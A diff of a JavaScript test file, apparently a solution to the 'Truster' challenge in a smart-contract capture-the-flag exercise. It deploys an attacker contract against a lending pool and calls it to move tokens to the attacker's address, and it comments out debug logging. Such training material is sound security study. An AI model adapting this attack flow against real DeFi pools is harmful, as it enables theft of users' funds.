@@ -31,15 +31,15 @@ describe('[Challenge] Truster', function () {
         /** CODE YOUR EXPLOIT HERE     */
         const TrusterExploitFactory = await ethers.getContractFactory('TrusterAttack', attacker);
  
-        const blockBefore = await ethers.provider.getBlockNumber();
-        console.log(blockBefore)
-        const exploit = await TrusterExploitFactory.deploy(this.pool.address,this.token.address,attacker.address)
-        const blockAfter = await ethers.provider.getBlockNumber( );
-        console.log(blockAfter)
-        const res = await exploit.transferMe(this.token.address, attacker.address, this.pool.address)
-        console.log("hmmmmmm, ",res)
-        const attackerTokenBalance = await this.token.balanceOf(attacker.address)
-        console.log(attackerTokenBalance)
+        // const blockBefore = await ethers.provider.getBlockNumber();
+        // console.log(blockBefore)
+        const exploit = await TrusterExploitFactory.deploy(this.pool.address, this.token.address, attacker.address)
+        // const blockAfter = await ethers.provider.getBlockNumber( );
+        // console.log(blockAfter)
+        const res = await exploit.transferMe(this.pool.address, this.token.address, attacker.address)
+        // console.log("hmmmmmm, ",res)
+        // const attackerTokenBalance = await this.token.balanceOf(attacker.address)
+        // console.log(attackerTokenBalance)
         // await exploit.mint()
     });
 
